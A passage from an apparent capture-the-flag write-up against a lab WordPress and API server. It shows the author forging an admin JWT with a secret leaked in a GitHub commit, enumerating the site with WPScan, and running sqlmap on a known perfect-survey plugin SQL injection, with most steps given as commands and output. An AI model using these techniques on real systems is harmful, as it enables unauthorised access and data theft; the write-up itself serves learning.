-<p>Bingo: <code>FLAG{SSRF_PARA_TOD@S_XD}</code></p>
-<p>Let&rsquo;s continue with the pwnage.</p>
-<p>Remember the robots.txt file? Well, here are the contents:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># https://wp.geohome.com</span></span></span></code></pre></div>
-<p>Let&rsquo;s add that to our hosts file and enter the website</p>
-<p><img src="/images/ctfs/schneidelec/geosite.png" alt="GeoSite"></p>
-<p>Good, let&rsquo;s find something in here of our interest.</p>
-<p>We find a <a href="https://github.com/geohome-dev/">GitHub profile link</a> at the bottom of the page alongside a facebook one.</p>
-<p>Let&rsquo;s try looking for the GitHub one&hellip; interesting, only 1 repo&hellip; let&rsquo;s access it:</p>
-<p>Maybe enter the commits section?</p>
-<p><img src="/images/ctfs/schneidelec/commits.png" alt="Commits"></p>
-<p>Bingo: <code>FLAG{ALWAYS_CHECK_COMMITS}</code></p>
-<p><img src="/images/ctfs/schneidelec/bwtm.jpg" alt="ButWaitTheresMore"></p>
-<p><img src="/images/ctfs/schneidelec/jwt.png" alt="JWT"></p>
-<p>We now have one more flag and a <em>secret</em> JSON Web Token <code>Ge0HomeIsThePlaceWhereFantasyMeetsReality</code> :)</p>
-<p>JSON&hellip; sounds familiar&hellip; Remember when we accessed the server&rsquo;s port 5000? It returns JSON data.</p>
-<p>Maybe something we can fuzz now that we have a JWT?</p>
-<p>Let&rsquo;s try the default endpoints for an API (/admin, /logout, /login, /register&hellip;)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145:5000/admin&#34;</span></span></span></code></pre></div>
-<p>Returns:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;Missing Authorization Header&#34;</span>}</span></span></code></pre></div>
-<p>nothing to see here&hellip; for now&hellip;</p>
-<p>Remember the GitHub&rsquo;s README?</p>
-<p><img src="/images/ctfs/schneidelec/api.png" alt="API"></p>
-<p>This comes handy&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145:5000/register&#34;</span> --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data-raw <span style="color:#e6db74">&#39;{&#34;username&#34;: &#34;challenge_rules_suck&#34;, &#34;password&#34;: &#34;suck_a_lot&#34;}&#39;</span></span></span></code></pre></div>
-<p>Returns:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;Message&#34;</span>: <span style="color:#e6db74">&#34;Username has been created! Now you can successfully login.&#34;</span>}</span></span></code></pre></div>
-<p>so&hellip; let&rsquo;s login?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145:5000/login&#34;</span> --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data-raw <span style="color:#e6db74">&#39;{&#34;username&#34;: &#34;challenge_rules_suck&#34;, &#34;password&#34;: &#34;suck_a_lot&#34;}&#39;</span></span></span></code></pre></div>
-<p>Returns:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;access_token&#34;</span>:  <span style="color:#e6db74">&#34;very_large_jwt_token&#34;</span>}</span></span></code></pre></div>
-<p>hmm&hellip;</p>
-<p>Maybe&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145:5000/logout&#34;</span></span></span></code></pre></div>
-<p>404&hellip; I guess we&rsquo;re stuck w/ the challenge_rules_suck account forever ;)</p>
-<p>Let&rsquo;s head over to <a href="https://jwt.io/">jwt.io</a> to inspect the token.</p>
-<p><img src="/images/ctfs/schneidelec/vjwt.png" alt="VJWT"></p>
-<p>Let&rsquo;s change the &ldquo;sub&rdquo; key w/ &ldquo;admin&rdquo;; input their leaked JWT secret and use the resulting token to log in.</p>
-<p><img src="/images/ctfs/schneidelec/cjwt.png" alt="CJWT"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145:5000/admin&#34;</span> --header <span style="color:#e6db74">&#34;Authorization: Bearer that_long_token_we_just_got&#34;</span></span></span></code></pre></div>
-<p>Returns:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;Flag&#34;</span>:  <span style="color:#e6db74">&#34;API_FLAG{Never_public_your_secret}&#34;</span>, <span style="color:#f92672">&#34;Message&#34;</span>:<span style="color:#e6db74">&#34;Oh hello again dear Administrator&#34;</span>}</span></span></code></pre></div>
-<p>Bingo: <code>API_FLAG{Never_public_your_secret}</code></p>
-<p>Alright, let&rsquo;s continue; <code>Wappalyzer</code> browser extension lists a website&rsquo;s building blocks; and it lists WordPress&hellip;</p>
-<p>One thing I learned from various CTFs is that WordPress is (If not done right) one of the most vulnerable-prone frameworks that exist, it having plugins makes it even more of a sticky-icky situation.</p>
-<p>Thanks to this (Curiously) <a href="https://apageinsec.wordpress.com/2019/04/03/raven-1-walkthrough/">WordPress blog entry</a> I found out that there&rsquo;s a tool called WPScan that is able to
-perform blackbox auditing on a remote WordPress website; so, what I did next is; install the tool and run a quick scan targetting the machine:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ wpscan --url https://wp.geohome.com/</span></span></code></pre></div>
-<p>Strange&hellip; :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Scan Aborted: The url supplied <span style="color:#e6db74">&#39;https://wp.geohome.com/&#39;</span> seems to be down <span style="color:#f92672">(</span>SSL peer certificate or SSH remote key was not OK<span style="color:#f92672">)</span></span></span></code></pre></div>
-<p>The URL is definitely up, as I&rsquo;m able to enter it without problems, but I remember facing a warning on Firefox the first time I accessed it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wp.geohome.com uses an invalid security certificate.&lt;br&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>The certificate is not trusted because it is self-signed.&lt;br&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Error code: MOZILLA_PKIX_ERROR_SELF_SIGNED_CERT&lt;br&gt;</span></span></code></pre></div>
-<p>Maybe this is related? I jumped on DuckDuck and found <a href="https://github.com/wpscanteam/wpscan/issues/1380#issuecomment-525762380">a GitHub link</a> with a possible workaround, so I went ahead and tried it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ wpscan --url https://wp.geohome.com/ --disable-tls-checks</span></span></code></pre></div>
-<details>
-<summary>WPScan Output:</summary>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_______________________________________________________________
-</span></span><span style="display:flex;"><span>__          _______   _____
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
-</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;_ \
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \  /\  /  | |     ____) | (__| (_| | | | |
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WordPress Security Scanner by the WPScan Team
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Version 3.8.22
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Sponsored by Automattic - https://automattic.com/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_______________________________________________________________
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] URL: https://wp.geohome.com/ [192.168.1.145]
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Started: Sun May 22 21:37:08 2022
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Interesting Finding(s):
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Headers
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Interesting Entries:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - server: Microsoft-IIS/10.0
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - x-powered-by: PHP/8.0.0
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Headers (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confidence: 100%
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] robots.txt found: https://wp.geohome.com/robots.txt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Interesting Entries:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - /wp-admin/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - /wp-admin/admin-ajax.php
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Robots Txt (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confidence: 100%
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] XML-RPC seems to be enabled: https://wp.geohome.com/xmlrpc.php
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confidence: 100%
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| References:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - http://codex.wordpress.org/XML-RPC_Pingback_API
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress readme found: https://wp.geohome.com/readme.html
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confidence: 100%
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] The external WP-Cron seems to be enabled: https://wp.geohome.com/wp-cron.php
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Direct Access (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confidence: 60%
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| References:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://www.iplocation.net/defend-wordpress-from-ddos
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://github.com/wpscanteam/wpscan/issues/1299
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress version 5.9.3 identified (Latest, released on 2022-04-05).
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Rss Generator (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://wp.geohome.com/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.3&lt;/generator&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://wp.geohome.com/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.3&lt;/generator&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress theme in use: twentytwentytwo
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Location: https://wp.geohome.com/wp-content/themes/twentytwentytwo/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Latest Version: 1.1 (up to date)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Last Updated: 2022-02-25T00:00:00.000Z
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Readme: https://wp.geohome.com/wp-content/themes/twentytwentytwo/readme.txt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Style URL: https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Style Name: Twenty Twenty-Two
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Style URI: https://wordpress.org/themes/twentytwentytwo/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Author: the WordPress team
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Author URI: https://wordpress.org/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Css Style In Homepage (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confirmed By: Css Style In 404 Page (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Version: 1.1 (80% confidence)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Style (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: &#39;</span>Version: 1.1<span style="color:#e6db74">&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Enumerating All Plugins (via Passive Methods)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Checking Plugin Versions (via Passive and Aggressive Methods)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] Plugin(s) Identified:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] bdthemes-element-pack-lite
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Location: https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Last Updated: 2022-05-21T12:23:00.000Z
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| [!] The version is out of date, the latest version is 4.2.1
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Urls In Homepage (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confirmed By: Urls In 404 Page (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Version: 4.1.0 (80% confidence)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Readme - Stable Tag (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/readme.txt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] elementor
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Location: https://wp.geohome.com/wp-content/plugins/elementor/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Latest Version: 3.6.5 (up to date)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Last Updated: 2022-04-27T13:20:00.000Z
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Urls In Homepage (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Version: 3.6.5 (100% confidence)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Found By: Query Parameter (Passive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.6.5
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Confirmed By:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  Readme - Stable Tag (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   - https://wp.geohome.com/wp-content/plugins/elementor/readme.txt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  Javascript Comment (Aggressive Detection)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: &#39;</span>elementor - v3.6.5<span style="color:#960050;background-color:#1e0010">&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> perfect-survey
-</span></span><span style="display:flex;"><span>| Location: https://wp.geohome.com/wp-content/plugins/perfect-survey/
-</span></span><span style="display:flex;"><span>| Latest Version: 1.5.1 <span style="color:#f92672">(</span>up to date<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| Last Updated: 2021-06-11T12:09:00.000Z
-</span></span><span style="display:flex;"><span>|
-</span></span><span style="display:flex;"><span>| Found By: Urls In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| Confirmed By: Urls In <span style="color:#ae81ff">404</span> Page <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|
-</span></span><span style="display:flex;"><span>| Version: 1.5.1 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|  - https://wp.geohome.com/wp-content/plugins/perfect-survey/readme.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pro-elements
-</span></span><span style="display:flex;"><span>| Location: https://wp.geohome.com/wp-content/plugins/pro-elements/
-</span></span><span style="display:flex;"><span>|
-</span></span><span style="display:flex;"><span>| Found By: Urls In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|
-</span></span><span style="display:flex;"><span>| The version could not be determined.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Config Backups <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Checking Config Backups - Time: 00:00:31 &lt;<span style="color:#f92672">===============================================================================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">137</span> / 137<span style="color:#f92672">)</span> 100.00% Time: 00:00:31
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No Config Backups Found.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Sun May <span style="color:#ae81ff">22</span> 21:37:44 <span style="color:#ae81ff">2022</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">159</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">30</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 47.619 KB
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 569.914 KB
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 234.621 MB
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:36</span></span></code></pre></div>
-</details>
-<p>We could try looking for Vulns in each out-to-date plugin, let&rsquo;s do that:</p>
-<p><code>bdthemes-element-pack-lite</code> looks outdated, but there are no known vulns so we don&rsquo;t have much left to check.</p>
-<p>Let&rsquo;s try with updated plugins:</p>
-<p><code>elementor</code>? Nope, <code>perfect-survey</code>?</p>
-<p><img src="/images/ctfs/schneidelec/exploit.png" alt="Exploit"></p>
-<p><a href="https://www.exploit-db.com/exploits/50766">Bingo!</a></p>
-<p>So the provided exploit-db&rsquo;s exploit uses <code>sqlmap</code> to exploit the vulnerability</p>
-<p>Let&rsquo;s use that:</p>
-<p>In the same fashion as HackUPC challenges, I needed to open BURP and specify the &ndash;proxy option to sqlmap in order for exploit-db&rsquo;s command to work:</p>
-<p>Fun fact: The machine BSOD while I was running SQLMap :D</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1:8080&#34;</span></span></span></code></pre></div>
-<details>
-<summary>SQLMap Output:</summary>>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>        ___
-</span></span><span style="display:flex;"><span>       __H__
-</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.6.6#stable}
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [&#39;]     | .&#39;| . |
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [&#39;]_|_|_|__,|  _|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 15:25:05 /2022-05-22/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;-u&#39;. Do you want to process it? [Y/n/q] Y
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:07] [INFO] testing connection to the target URL
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">you have not declared cookie(s), while server wants to set its own (&#39;wp-ps-session=ckshrftg341...9l2980fo6c&#39;). Do you want to use those [Y/n] Y
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:09] [INFO] testing if the target URL content is stable
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [INFO] target URL content is stable
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [INFO] testing if URI parameter &#39;#1*&#39; is dynamic
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [WARNING] URI parameter &#39;#1*&#39; does not appear to be dynamic
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [WARNING] heuristic (basic) test shows that URI parameter &#39;#1*&#39; might not be injectable
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [INFO] testing for SQL injection on URI parameter &#39;#1*&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:10] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:11] [WARNING] reflective value(s) found and filtering out
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:12] [INFO] URI parameter &#39;#1*&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --code=200)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39; 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] n
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:19] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:19] [INFO] testing &#39;Generic inline queries&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:20] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:20] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)   
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:34] [INFO] URI parameter &#39;#1*&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable
